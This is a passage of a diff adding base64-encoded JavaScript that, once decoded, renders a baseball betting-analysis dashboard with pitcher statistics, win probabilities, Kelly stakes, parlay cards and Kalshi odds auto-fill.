+`c3R5bGU9ImhlaWdodDoxMDAlO2JvcmRlci1yYWRpdXM6MnB4O3Bvc2l0aW9u`,
+`OmFic29sdXRlO3dpZHRoOicrcGN0KyclO2JhY2tncm91bmQ6Jytjb2wrJzsn`,
+`K2JhclN0eWxlKyciPjwvZGl2PjwvZGl2PjwvZGl2Pic7fQpmdW5jdGlvbiBw`,
+`aXRjaEJveChuYW1lLHAscGl0Y2hlcil7cmV0dXJuJzxkaXYgc3R5bGU9ImJh`,
+`Y2tncm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwuMDIpO2JvcmRlci1yYWRpdXM6`,
+`NnB4O3BhZGRpbmc6MTBweCAxMnB4O2JvcmRlcjoxcHggc29saWQgIzJlMjQx`,
+`NiI+PGRpdiBzdHlsZT0iZm9udC1zaXplOjExcHg7Zm9udC13ZWlnaHQ6NzAw`,
+`O2NvbG9yOiNjOGI4OTA7bWFyZ2luLWJvdHRvbTozcHgiPicrbmFtZS5zcGxp`,
+`dCgnICcpLnBvcCgpKyc8L2Rpdj48ZGl2IHN0eWxlPSJmb250LXNpemU6MTBw`,
+`eDtjb2xvcjojNmE1YTNhO21hcmdpbi1ib3R0b206NHB4Ij5TUDogJytwaXRj`,
+`aGVyKyc8L2Rpdj48ZGl2IHN0eWxlPSJmb250LXNpemU6MTBweDtjb2xvcjoj`,
+`NWE0YTJhO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZSI+RVJBICcrcC5zdGFydGVy`,
+`RXJhLnRvRml4ZWQoMikrJyBGSVAgJytwLnN0YXJ0ZXJGaXAudG9GaXhlZCgy`,
+`KSsnIHhGSVAgJytwLnN0YXJ0ZXJYZmlwLnRvRml4ZWQoMikrJzwvZGl2Pjxk`,
+`aXYgc3R5bGU9ImZvbnQtc2l6ZToxMHB4O2NvbG9yOiM0YTRhMmE7Zm9udC1m`,
+`YW1pbHk6bW9ub3NwYWNlO21hcmdpbi10b3A6MXB4Ij5XSElQICcrcC5zdGFy`,
+`dGVyV2hpcC50b0ZpeGVkKDIpKycgSy85ICcrcC5zdGFydGVySzkudG9GaXhl`,
+`ZCgxKSsnIEJCLzkgJytwLnN0YXJ0ZXJCYjkudG9GaXhlZCgxKSsnPC9kaXY+`,
+`PGRpdiBzdHlsZT0ibWFyZ2luLXRvcDo1cHg7cGFkZGluZzozcHggOHB4O2Jh`,
+`Y2tncm91bmQ6cmdiYSgyMDAsMTQ2LDQyLC4wNik7Ym9yZGVyLXJhZGl1czo0`,
+`cHg7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2ZvbnQtc2l6ZToxMHB4O2NvbG9y`,
+`OiNjODkyMmE7Zm9udC13ZWlnaHQ6NzAwIj5CbGVuZGVkOiBGSVAgJytwLmJs`,
+`ZW5kZWRGaXAudG9GaXhlZCgyKSsnIFdISVAgJytwLmJsZW5kZWRXaGlwLnRv`,
+`Rml4ZWQoMikrJyBLLzkgJytwLmJsZW5kZWRLOS50b0ZpeGVkKDEpKyc8L2Rp`,
+`dj48L2Rpdj4nO30KZnVuY3Rpb24gcGFybGF5Q2FyZEhUTUwocGxheSl7dmFy`,
+`IHR5cGVDb2w9cGxheS5sZWdzLmxlbmd0aD09PTE/JyNjODkyMmEnOnBsYXku`,
+`bGVncy5sZW5ndGg9PT0yPycjNWE5YWMwJzonIzlhNWFjMCc7dmFyIHN0YWtl`,
+`PSgocGxheS5rZWxseVBjdC8xMDApKlMuYmFua3JvbGwpLnRvRml4ZWQoMik7`,
+`dmFyIHdpbkFtdD0oKHBsYXkucGF5b3V0LTEpKnBhcnNlRmxvYXQoc3Rha2Up`,
+`KS50b0ZpeGVkKDIpO3ZhciBjb25mTGFiZWw9cGxheS5jb21iaW5lZFA+PTAu`,
+`NjU/J0hpZ2gnOnBsYXkuY29tYmluZWRQPj0wLjU3PydNZWRpdW0nOidMb3cn`,
+`O3ZhciBlZGdlVmFsPXBsYXkuY29tYmluZWRFZGdlIT09bnVsbCYmcGxheS5j`,
+`b21iaW5lZEVkZ2UhPT11bmRlZmluZWQ/cGxheS5jb21iaW5lZEVkZ2U6KHBs`,
+`YXkubGVnc1swXT9wbGF5LmxlZ3NbMF0uZWRnZVBjdDpudWxsKTt2YXIgaHRt`,
+`bD0nPGRpdiBzdHlsZT0iYm9yZGVyOjFweCBzb2xpZCAnK3R5cGVDb2wrJzti`,
+`YWNrZ3JvdW5kOnJnYmEoMjU1LDI1NSwyNTUsLjAyKTtib3JkZXItcmFkaXVz`,
+`OjEwcHg7cGFkZGluZzoxNHB4IDE2cHg7bWFyZ2luLWJvdHRvbToxMHB4Ij4n`,
+`O2h0bWwrPSc8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250`,
+`ZW50OnNwYWNlLWJldHdlZW47YWxpZ24taXRlbXM6Y2VudGVyO21hcmdpbi1i`,
+`b3R0b206MTBweDtmbGV4LXdyYXA6d3JhcDtnYXA6NnB4Ij48c3BhbiBzdHls`,
+`ZT0iZm9udC1zaXplOjExcHg7Zm9udC13ZWlnaHQ6NzAwO2NvbG9yOicrdHlw`,
+`ZUNvbCsnO2xldHRlci1zcGFjaW5nOjJweDt0ZXh0LXRyYW5zZm9ybTp1cHBl`,
+`cmNhc2UiPicrcGxheS50eXBlKyc8L3NwYW4+JztodG1sKz0nPGRpdiBzdHls`,
+`ZT0iZGlzcGxheTpmbGV4O2dhcDo4cHg7YWxpZ24taXRlbXM6Y2VudGVyO2Zs`,
+`ZXgtd3JhcDp3cmFwIj4nK2VkZ2VCYWRnZShlZGdlVmFsKSsnPHNwYW4gc3R5`,
+`bGU9ImZvbnQtc2l6ZToxMXB4O2NvbG9yOicrKHBsYXkuY29tYmluZWRQPj0w`,
+`LjY1PycjYzg5MjJhJzpwbGF5LmNvbWJpbmVkUD49MC41Nz8nIzhhOGEzYSc6`,
+`JyM2YTVhM2EnKSsnO2ZvbnQtd2VpZ2h0OjcwMCI+Jytjb25mTGFiZWwrJzwv`,
+`c3Bhbj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjExcHg7Y29sb3I6IzZhNWEz`,
+`YTtmb250LWZhbWlseTptb25vc3BhY2UiPicrKHBsYXkuY29tYmluZWRQKjEw`,
+`MCkudG9GaXhlZCgxKSsnJTwvc3Bhbj48L2Rpdj48L2Rpdj4nO3BsYXkubGVn`,
+`cy5mb3JFYWNoKGZ1bmN0aW9uKGxlZyxsaSl7aHRtbCs9JzxkaXYgc3R5bGU9`,
+`ImRpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2Vlbjth`,
+`bGlnbi1pdGVtczpjZW50ZXI7cGFkZGluZzo4cHggMTBweDtiYWNrZ3JvdW5k`,
+`OnJnYmEoMjU1LDI1NSwyNTUsLjAyKTtib3JkZXItcmFkaXVzOjZweDttYXJn`,
+`aW4tYm90dG9tOjZweDtib3JkZXI6MXB4IHNvbGlkICMyZTI0MTY7Y3Vyc29y`,
+`OnBvaW50ZXIiIG9uY2xpY2s9InZpZXdMZWdEZXRhaWwoJytsaSsnLCcrbGVn`,
+`LmdhbWVQaysnKSI+JztodG1sKz0nPGRpdj48ZGl2IHN0eWxlPSJmb250LXNp`,
+`emU6MTNweDtmb250LXdlaWdodDo3MDA7Y29sb3I6I2UwYjA0MCI+JytsZWcu`,
+`d2lubmVyKyc8L2Rpdj48ZGl2IHN0eWxlPSJmb250LXNpemU6MTBweDtjb2xv`,
+`cjojNmE1YTNhIj4nKyhsZWcud2lubmVyPT09bGVnLmFOYW1lPydBd2F5Jzon`,
+`SG9tZScpKycgJytsZWcudGltZSsnPC9kaXY+PGRpdiBzdHlsZT0iZm9udC1z`,
+`aXplOjEwcHg7Y29sb3I6IzRhNGEyYSI+dnMgJysobGVnLndpbm5lcj09PWxl`,
+`Zy5hTmFtZT9sZWcuYk5hbWU6bGVnLmFOYW1lKSsnPC9kaXY+PC9kaXY+Jzto`,
+`dG1sKz0nPGRpdiBzdHlsZT0idGV4dC1hbGlnbjpyaWdodCI+JysobGVnLmJv`,
+`b2tNTD8nPGRpdiBzdHlsZT0iZm9udC1zaXplOjEycHg7Zm9udC13ZWlnaHQ6`,
+`OTAwO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtjb2xvcjonKyhsZWcuYm9va01M`,
+`WzBdPT09JysnPycjNWFiYThhJzonI2M4Yjg5MCcpKyciPicrbGVnLmJvb2tN`,
+`TCsnIDxzcGFuIHN0eWxlPSJmb250LXNpemU6OXB4O2NvbG9yOiMyZTI0MTYi`,
+`PmJvb2s8L3NwYW4+PC9kaXY+JzonJyk7aHRtbCs9JzxkaXYgc3R5bGU9ImZv`,
+`bnQtc2l6ZToxMXB4O2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTtjb2xvcjojNmE1`,
+`YTNhIj4nK2xlZy53aW5uZXJNTCsnIDxzcGFuIHN0eWxlPSJmb250LXNpemU6`,
+`OXB4O2NvbG9yOiMyZTI0MTYiPm1vZGVsPC9zcGFuPjwvZGl2Pic7aWYobGVn`,
+`LmVkZ2VQY3QhPT1udWxsJiZsZWcuZWRnZVBjdCE9PXVuZGVmaW5lZClodG1s`,
+`Kz0nPGRpdiBzdHlsZT0iZm9udC1zaXplOjExcHg7Zm9udC13ZWlnaHQ6NzAw`,
+`O2NvbG9yOicrKGxlZy5lZGdlUGN0Pj0wLjAzPycjNWFiYThhJzonI2MwYzA2`,
+`MCcpKyciPicrKGxlZy5lZGdlUGN0Pj0wPycrJzonJykrKGxlZy5lZGdlUGN0`,
+`KjEwMCkudG9GaXhlZCgxKSsnJTwvZGl2Pic7aHRtbCs9JzwvZGl2PjwvZGl2`,
+`Pic7fSk7aHRtbCs9JzxkaXYgc3R5bGU9Im1hcmdpbi10b3A6MTBweDtwYWRk`,
+`aW5nOjEwcHggMTJweDtiYWNrZ3JvdW5kOnJnYmEoMjAwLDE0Niw0MiwuMDUp`,
+`O2JvcmRlcjoxcHggc29saWQgIzJlMjQxNjtib3JkZXItcmFkaXVzOjhweCI+`,
+`PGRpdiBzdHlsZT0iZGlzcGxheTpncmlkO2dyaWQtdGVtcGxhdGUtY29sdW1u`,
+`czoxZnIgMWZyIDFmciAxZnI7Z2FwOjhweDt0ZXh0LWFsaWduOmNlbnRlciI+`,
+`JztbWydLZWxseSAlJyxwbGF5LmtlbGx5UGN0LnRvRml4ZWQoMSkrJyUnLGZh`,
+`bHNlXSxbJ1N0YWtlJywnJCcrc3Rha2UsZmFsc2VdLFsnUGF5b3V0JyxwbGF5`,
+`LnBheW91dC50b0ZpeGVkKDIpKyd4JyxmYWxzZV0sWydOZXQgV2luJywnJCcr`,
+`d2luQW10LHRydWVdXS5mb3JFYWNoKGZ1bmN0aW9uKGl0ZW0pe2h0bWwrPSc8`,
+`ZGl2PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZTo5cHg7Y29sb3I6IzJlMjQxNjts`,
+`ZXR0ZXItc3BhY2luZzoxcHg7dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO21h`,
+`cmdpbi1ib3R0b206MnB4Ij4nK2l0ZW1bMF0rJzwvZGl2PjxkaXYgc3R5bGU9`,
+`ImZvbnQtc2l6ZToxM3B4O2ZvbnQtd2VpZ2h0OjkwMDtmb250LWZhbWlseTpt`,
+`b25vc3BhY2U7Y29sb3I6JysoaXRlbVsyXT8nIzVhYmE4YSc6JyNjOGI4OTAn`,
+`KSsnIj4nK2l0ZW1bMV0rJzwvZGl2PjwvZGl2Pic7fSk7aHRtbCs9JzwvZGl2`,
+`Pic7aWYocGxheS5sZWdzLmxlbmd0aD4xKWh0bWwrPSc8ZGl2IHN0eWxlPSJt`,
+`YXJnaW4tdG9wOjhweDtmb250LXNpemU6MTBweDtjb2xvcjojMmUyNDE2O3Rl`,
+`eHQtYWxpZ246Y2VudGVyIj5XaW4gcHJvYiA9ICcrcGxheS5sZWdzLm1hcChm`,
+`dW5jdGlvbihsKXtyZXR1cm4obC53aW5uZXJQKjEwMCkudG9GaXhlZCgwKSsn`,
+`JSc7fSkuam9pbignIHggJykrJyA9ICcrKHBsYXkuY29tYmluZWRQKjEwMCku`,
+`dG9GaXhlZCgxKSsnJTwvZGl2Pic7aHRtbCs9JzwvZGl2PjwvZGl2Pic7cmV0`,
+`dXJuIGh0bWw7fQp2YXIgY3VycmVudFRhYj0wOwpmdW5jdGlvbiBzaG93VGFi`,
+`KG4pe2N1cnJlbnRUYWI9bjtkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcu`,
+`dGFiJykuZm9yRWFjaChmdW5jdGlvbih0LGkpe3QuY2xhc3NMaXN0LnRvZ2ds`,
+`ZSgnYWN0aXZlJyxpPT09bik7fSk7ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFs`,
+`bCgnLnBhbmVsJykuZm9yRWFjaChmdW5jdGlvbihwLGkpe3AuY2xhc3NMaXN0`,
+`LnRvZ2dsZSgnYWN0aXZlJyxpPT09bik7fSk7aWYobj09PTApcmVuZGVyQm9h`,
+`cmQoKTtpZihuPT09MSlyZW5kZXJEZXRhaWwoKTtpZihuPT09MilyZW5kZXJQ`,
+`bGF5cygpO2lmKG49PT0zKXJlbmRlckJhY2t0ZXN0KCk7aWYobj09PTQpcmVu`,
+`ZGVyVHJhZGVMb2coKTt9CmZ1bmN0aW9uIHJlbmRlckJvYXJkKCl7dmFyIGVs`,
+`PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0YWIwJyk7aWYoIWVsKXJldHVy`,
+`bjt2YXIgaHRtbD0nPGRpdiBjbGFzcz0iY2FyZCI+JztodG1sKz0nPGRpdiBz`,
+`dHlsZT0iZGlzcGxheTpmbGV4O2dhcDoxMHB4O2FsaWduLWl0ZW1zOmNlbnRl`,
+`cjtmbGV4LXdyYXA6d3JhcCI+JztodG1sKz0nPGlucHV0IHR5cGU9ImRhdGUi`,
+`IGlkPSJkYXRlLWluIiB2YWx1ZT0iJytTLmRhdGUrJyIgc3R5bGU9ImZsZXg6`,
+`MSAxIDE0MHB4O2ZvbnQtc2l6ZToxNHB4Ij4nO2h0bWwrPSc8ZGl2IHN0eWxl`,
+`PSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDo2cHg7Zmxl`,
+`eDoxIDEgMTMwcHgiPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MTFweDtjb2xv`,
+`cjojNmE1YTNhO3doaXRlLXNwYWNlOm5vd3JhcCI+QmFua3JvbGwgJDwvc3Bh`,
+`bj48aW5wdXQgdHlwZT0ibnVtYmVyIiBpZD0iYmFuay1pbiIgdmFsdWU9Iicr`,
+`Uy5iYW5rcm9sbCsnIiBtaW49IjEwMCIgc3R5bGU9ImZsZXg6MTtmb250LXNp`,
+`emU6MTRweCI+PC9kaXY+JztodG1sKz0nPGJ1dHRvbiBvbmNsaWNrPSJkb0Fu`,
+`YWx5emUoKSIgJysoUy5sb2FkaW5nPydkaXNhYmxlZCc6JycpKycgc3R5bGU9`,
+`InBhZGRpbmc6OXB4IDE4cHg7Ym9yZGVyLXJhZGl1czo2cHg7Ym9yZGVyOm5v`,
+`bmU7YmFja2dyb3VuZDonKyhTLmxvYWRpbmc/JyMyZTI0MTYnOidsaW5lYXIt`,
+`Z3JhZGllbnQoMTM1ZGVnLCNjODkyMmEsIzlhNmUxOCknKSsnO2NvbG9yOicr`,
+`KFMubG9hZGluZz8nIzZhNWEzYSc6JyMwODA2MDAnKSsnO2ZvbnQtd2VpZ2h0`,
+`OjkwMDtmb250LXNpemU6MTJweDtsZXR0ZXItc3BhY2luZzoycHg7dGV4dC10`,
+`cmFuc2Zvcm06dXBwZXJjYXNlO2N1cnNvcjonKyhTLmxvYWRpbmc/J25vdC1h`,
+`bGxvd2VkJzoncG9pbnRlcicpKyc7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1z`,
+`OmNlbnRlcjtnYXA6OHB4O3doaXRlLXNwYWNlOm5vd3JhcCI+JztpZihTLmxv`,
+`YWRpbmcpaHRtbCs9JzxzcGFuIGNsYXNzPSJzcGluIj48L3NwYW4+JztodG1s`,
+`Kz0oUy5sb2FkaW5nPydBbmFseXppbmcuLi4nOidBbmFseXplIEFsbCcpKyc8`,
+`L2J1dHRvbj48L2Rpdj4nO2lmKFMubG9hZGluZylodG1sKz0nPGRpdiBzdHls`,
+`ZT0ibWFyZ2luLXRvcDoxMHB4O2ZvbnQtc2l6ZToxMXB4O2NvbG9yOiM2YTVh`,
+`M2E7ZGlzcGxheTpmbGV4O2dhcDo4cHg7YWxpZ24taXRlbXM6Y2VudGVyIj48`,
+`c3BhbiBjbGFzcz0ic3BpbiI+PC9zcGFuPicrUy5wcm9ncmVzcysnPC9kaXY+`,
+`JztodG1sKz0nPC9kaXY+JztpZihTLmVycm9yKWh0bWwrPSc8ZGl2IGNsYXNz`,
+`PSJlcnJvci1ib3giPicrUy5lcnJvcisnPC9kaXY+JztpZihTLnJlc3VsdHMu`,
+`bGVuZ3RoKXtodG1sKz0nPGRpdiBjbGFzcz0iY2FyZCI+PGRpdiBzdHlsZT0i`,
+`ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO2Fs`,
+`aWduLWl0ZW1zOmNlbnRlcjttYXJnaW4tYm90dG9tOjEwcHg7ZmxleC13cmFw`,
+`OndyYXA7Z2FwOjhweCI+PGRpdiBjbGFzcz0ibGJsIiBzdHlsZT0ibWFyZ2lu`,
+`LWJvdHRvbTowIj4nK1MucmVzdWx0cy5sZW5ndGgrJyBHYW1lcyAtICcrUy5k`,
+`YXRlKyc8L2Rpdj48YnV0dG9uIG9uY2xpY2s9ImRvQXV0b0ZpbGwoKSIgc3R5`,
+`bGU9InBhZGRpbmc6NnB4IDE0cHg7Ym9yZGVyLXJhZGl1czo2cHg7Ym9yZGVy`,
+`OjFweCBzb2xpZCAjM2E1YTNhO2JhY2tncm91bmQ6cmdiYSg5MCwxODYsMTM4`,
+`LDAuMSk7Y29sb3I6IzVhYmE4YTtmb250LXNpemU6MTFweDtmb250LXdlaWdo`,
+`dDo3MDA7Y3Vyc29yOnBvaW50ZXIiPkF1dG8tZmlsbCBLYWxzaGkgT2Rkczwv`,
+`YnV0dG9uPjwvZGl2Pic7Uy5yZXN1bHRzLnNsaWNlKCkuc29ydChmdW5jdGlv`,
+`bihhLGIpe3JldHVybiBiLndpbm5lclAtYS53aW5uZXJQO30pLmZvckVhY2go`,
+`ZnVuY3Rpb24ocil7dmFyIGJtbD1TLmJvb2tPZGRzW3IuZ2FtZVBrXXx8bnVs`,
+`bDt2YXIgZT1ibWw/ZWRnZUNhbGMoci53aW5uZXJQLGJtbCk6bnVsbDtodG1s`,
+`Kz0nPGRpdiBjbGFzcz0iZ2FtZS1yb3ciPjxkaXYgb25jbGljaz0idmlld0dh`,
+`bWUoJycrci5nYW1lUGsrJycpIiBzdHlsZT0iY3Vyc29yOnBvaW50ZXIiPjxk`,
+`aXYgc3R5bGU9ImRpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2Ut`,
+`YmV0d2VlbjthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOjhweDtmbGV4LXdyYXA6`,
+`d3JhcCI+PGRpdiBzdHlsZT0iZmxleDoxIj48c3BhbiBzdHlsZT0iZm9udC1z`,
+`aXplOjEzcHg7Zm9udC13ZWlnaHQ6NzAwO2NvbG9yOiNlMGIwNDAiPicrci53`,
+`aW5uZXIrJzwvc3Bhbj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjExcHg7Y29s`,
+`b3I6IzZhNWEzYTttYXJnaW46MCA2cHgiPmRlZi48L3NwYW4+PHNwYW4gc3R5`,
+`bGU9ImZvbnQtc2l6ZToxM3B4O2NvbG9yOiM1NTUiPicrKHIud2lubmVyPT09`,
+`ci5hTmFtZT9yLmJOYW1lOnIuYU5hbWUpKyc8L3NwYW4+PC9kaXY+PGRpdiBz`,
+`dHlsZT0iZGlzcGxheTpmbGV4O2dhcDo4cHg7YWxpZ24taXRlbXM6Y2VudGVy`,
+`Ij48c3BhbiBzdHlsZT0iZm9udC1zaXplOjEycHg7Zm9udC1mYW1pbHk6bW9u`,
+`b3NwYWNlO2NvbG9yOicrKHIud2lubmVyTUxbMF09PT0nKyc/JyM1YWJhOGEn`,
+`OicjYzhiODkwJykrJztmb250LXdlaWdodDo3MDAiPicrci53aW5uZXJNTCsn`,
+`PC9zcGFuPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MTFweDtjb2xvcjojYzhi`,
+`ODkwIj4nKyhyLndpbm5lclAqMTAwKS50b0ZpeGVkKDApKyclPC9zcGFuPjxz`,
+`cGFuIHN0eWxlPSJmb250LXNpemU6MTBweDtmb250LXdlaWdodDo3MDA7Y29s`,
+`b3I6Jytjb25mQ29sKHIuY29uZmlkZW5jZSkrJyI+JytyLmNvbmZpZGVuY2Ur`,
+`Jzwvc3Bhbj48L2Rpdj48L2Rpdj48ZGl2IHN0eWxlPSJtYXJnaW4tdG9wOjNw`,
+`eDtmb250LXNpemU6MTBweDtjb2xvcjojNmE1YTNhIj4nK3IudGltZSsnIE8v`,
+`VSAnK3Iub3UrJzwvZGl2PjwvZGl2PjxkaXYgc3R5bGU9ImRpc3BsYXk6Zmxl`,
+`eDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOjhweDttYXJnaW4tdG9wOjhweCIg`,
+`b25jbGljaz0iZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCkiPjxzcGFuIHN0eWxl`,
+`PSJmb250LXNpemU6OXB4O2NvbG9yOiMyZTI0MTY7d2hpdGUtc3BhY2U6bm93`,
+`cmFwIj5Cb29rIE1MOjwvc3Bhbj48aW5wdXQgdHlwZT0idGV4dCIgcGxhY2Vo`,
+`b2xkZXI9IisxMTAiIHZhbHVlPSInKyhibWx8fCcnKSsnIiBkYXRhLWdwaz0i`,
+`JytyLmdhbWVQaysnIiBvbmNsaWNrPSJldmVudC5zdG9wUHJvcGFnYXRpb24o`,
+`KSIgb25pbnB1dD0ic2V0Qm9va09kZCh0aGlzKSIgc3R5bGU9IndpZHRoOjY0`,
+`cHg7Ym9yZGVyLWNvbG9yOicrKGJtbD8nIzNhNWEzYSc6JyMyZTI0MTYnKSsn`,
+`O2NvbG9yOicrKGJtbD8nIzVhYmE4YSc6JyM2YTVhM2EnKSsnO2ZvbnQtc2l6`,
+`ZToxMXB4O3BhZGRpbmc6M3B4IDZweDt0ZXh0LWFsaWduOmNlbnRlciI+Jztp`,
+`ZihlIT09bnVsbClodG1sKz0nPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZToxMHB4`,
+`O2ZvbnQtd2VpZ2h0OjcwMDtmb250LWZhbWlseTptb25vc3BhY2U7Y29sb3I6`,
+`JysoZT49MC4wNT8nIzVhYmE4YSc6ZT49MC4wMj8nIzhhYmE1YSc6ZT49MD8n`,
+`I2MwYzA2MCc6JyNjMDYwNjAnKSsnIj4nKyhlPj0wPycrJzonJykrKGUqMTAw`,
+`KS50b0ZpeGVkKDEpKyclPC9zcGFuPic7aHRtbCs9JzwvZGl2PjwvZGl2Pic7`,
+`fSk7aHRtbCs9JzwvZGl2Pic7fWVsLmlubmVySFRNTD1odG1sO3ZhciBkaT1k`,
+`b2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGF0ZS1pbicpO2lmKGRpKWRpLm9u`,
+`Y2hhbmdlPWZ1bmN0aW9uKCl7c1NldCgnZGF0ZScsdGhpcy52YWx1ZSk7Uy5y`,
+`ZXN1bHRzPVtdO1MucGFybGF5cz1udWxsO3JlbmRlckJvYXJkKCk7fTt2YXIg`,
+`Ymk9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhbmstaW4nKTtpZihiaSli`,
+`aS5vbmNoYW5nZT1mdW5jdGlvbigpe3NTZXQoJ2Jhbmtyb2xsJyxwYXJzZUZs`,
+`b2F0KHRoaXMudmFsdWUpfHwxMDAwKTt9O30KZnVuY3Rpb24gc2V0Qm9va09k`,
+`ZChlbCl7dmFyIGdwaz1lbC5nZXRBdHRyaWJ1dGUoJ2RhdGEtZ3BrJyk7Uy5i`,
+`b29rT2Rkc1tncGtdPWVsLnZhbHVlO2xzU2V0KCdkbS1ib29rb2RkcycsUy5i`,
+`b29rT2Rkcyk7fQpmdW5jdGlvbiB2aWV3R2FtZShncGspe3ZhciByPVMucmVz`,
+`dWx0cy5maW5kKGZ1bmN0aW9uKHgpe3JldHVybiB4LmdhbWVQaz09Z3BrO30p`,
+`O2lmKHIpe1MuZGV0YWlsPXI7c2hvd1RhYigxKTt9fQpmdW5jdGlvbiB2aWV3`,
+`TGVnRGV0YWlsKGxpLGdwayl7dmFyIHI9Uy5yZXN1bHRzLmZpbmQoZnVuY3Rp`,
+`b24oeCl7cmV0dXJuIHguZ2FtZVBrPT1ncGs7fSk7aWYocil7Uy5kZXRhaWw9`,
+`cjtzaG93VGFiKDEpO319CmZ1bmN0aW9uIGRvQW5hbHl6ZSgpe1MubG9hZGlu`,
+`Zz10cnVlO1MuZXJyb3I9Jyc7Uy5yZXN1bHRzPVtdO1MucGFybGF5cz1udWxs`,
+`O1MucHJvZ3Jlc3M9J0xvYWRpbmcgc2NoZWR1bGUuLi4nO3JlbmRlckJvYXJk`,
+`KCk7ZmV0Y2hHYW1lcyhTLmRhdGUpLnRoZW4oZnVuY3Rpb24oZ2FtZUxpc3Qp`,
+`e2lmKCFnYW1lTGlzdC5sZW5ndGgpe1MuZXJyb3I9J05vIGdhbWVzIGZvdW5k`,
+`IGZvciAnK1MuZGF0ZTtTLmxvYWRpbmc9ZmFsc2U7cmVuZGVyQm9hcmQoKTty`,
+`ZXR1cm47fVMucHJvZ3Jlc3M9J0FuYWx5emluZyAnK2dhbWVMaXN0Lmxlbmd0`,
+`aCsnIGdhbWVzLi4uJztyZW5kZXJCb2FyZCgpO3ZhciBhbmFseXplZD1bXSxp`,
+`PTA7ZnVuY3Rpb24gbmV4dCgpe2lmKGk+PWdhbWVMaXN0Lmxlbmd0aCl7Uy5s`,
+`b2FkaW5nPWZhbHNlO1MucmVzdWx0cz1hbmFseXplZDtTLnBhcmxheXM9YnVp`,
+`bGRQYXJsYXlzKGFuYWx5emVkLFMuYm9va09kZHMsUy5taW5FZGdlKTtyZW5k`,
+`ZXJCb2FyZCgpO3JldHVybjt9dmFyIGJhdGNoPWdhbWVMaXN0LnNsaWNlKGks`,
+`aSszKTtpKz0zO1MucHJvZ3Jlc3M9J0FuYWx5emVkICcrTWF0aC5taW4oaSxn`,
+`YW1lTGlzdC5sZW5ndGgpKycvJytnYW1lTGlzdC5sZW5ndGgrJy4uLic7cmVu`,
+`ZGVyQm9hcmQoKTtQcm9taXNlLmFsbFNldHRsZWQoYmF0Y2gubWFwKGZ1bmN0`,
+`aW9uKGcpe3JldHVybiBhbmFseXplR2FtZShnLFMuZGF0ZSk7fSkpLnRoZW4o`,
+`ZnVuY3Rpb24ocmVzKXtyZXMuZm9yRWFjaChmdW5jdGlvbihyKXtpZihyLnN0`,
+`YXR1cz09PSdmdWxmaWxsZWQnKWFuYWx5emVkLnB1c2goci52YWx1ZSk7fSk7`,
+`bmV4dCgpO30pO31uZXh0KCk7fSkuY2F0Y2goZnVuY3Rpb24oZSl7Uy5lcnJv`,
+`cj0nRXJyb3I6ICcrZS5tZXNzYWdlO1MubG9hZGluZz1mYWxzZTtyZW5kZXJC`,
+`b2FyZCgpO30pO30KZnVuY3Rpb24gZG9BdXRvRmlsbCgpe2ZldGNoS2Fsc2hp`,
+`T2RkcyhTLnJlc3VsdHMpLnRoZW4oZnVuY3Rpb24ob2Rkcyl7dmFyIGZpbGxl`,
+`ZD0wO09iamVjdC5rZXlzKG9kZHMpLmZvckVhY2goZnVuY3Rpb24oZ3BrKXtp`,
+`ZihvZGRzW2dwa10pe1MuYm9va09kZHNbZ3BrXT1vZGRzW2dwa107ZmlsbGVk`,
+`Kys7fX0pO2xzU2V0KCdkbS1ib29rb2RkcycsUy5ib29rT2Rkcyk7aWYoZmls`,
+`bGVkPjApe1MucGFybGF5cz1idWlsZFBhcmxheXMoUy5yZXN1bHRzLFMuYm9v`,
+`a09kZHMsUy5taW5FZGdlKTthbGVydCgnRmlsbGVkICcrZmlsbGVkKycgS2Fs`,
+`c2hpIGxpbmVzIScpO31lbHNlIGFsZXJ0KCdObyBLYWxzaGkgbWFya2V0cyBt`,
+`YXRjaGVkLiBFbnRlciBvZGRzIG1hbnVhbGx5LicpO3JlbmRlckJvYXJkKCk7`,
+`fSk7fQpmdW5jdGlvbiByZW5kZXJEZXRhaWwoKXt2YXIgZWw9ZG9jdW1lbnQu`,
+`Z2V0RWxlbWVudEJ5SWQoJ3RhYjEnKTtpZighZWwpcmV0dXJuO3ZhciByPVMu`,
+`ZGV0YWlsO2lmKCFyKXtlbC5pbm5lckhUTUw9JzxkaXYgY2xhc3M9ImNhcmQi`,
+`IHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjtwYWRkaW5nOjMycHgiPjxkaXYg`,
+`c3R5bGU9ImZvbnQtc2l6ZTozMnB4O21hcmdpbi1ib3R0b206MTBweCI+JiMx`,
+`MjgyNjk7PC9kaXY+PGRpdiBzdHlsZT0iY29sb3I6IzZhNWEzYSI+U2VsZWN0`,
+`IGEgZ2FtZSBmcm9tIERhaWx5IEJvYXJkLjwvZGl2PjwvZGl2Pic7cmV0dXJu`,
+`O312YXIgYm1sPVMuYm9va09kZHNbci5nYW1lUGtdfHxudWxsO3ZhciBrPWJt`,
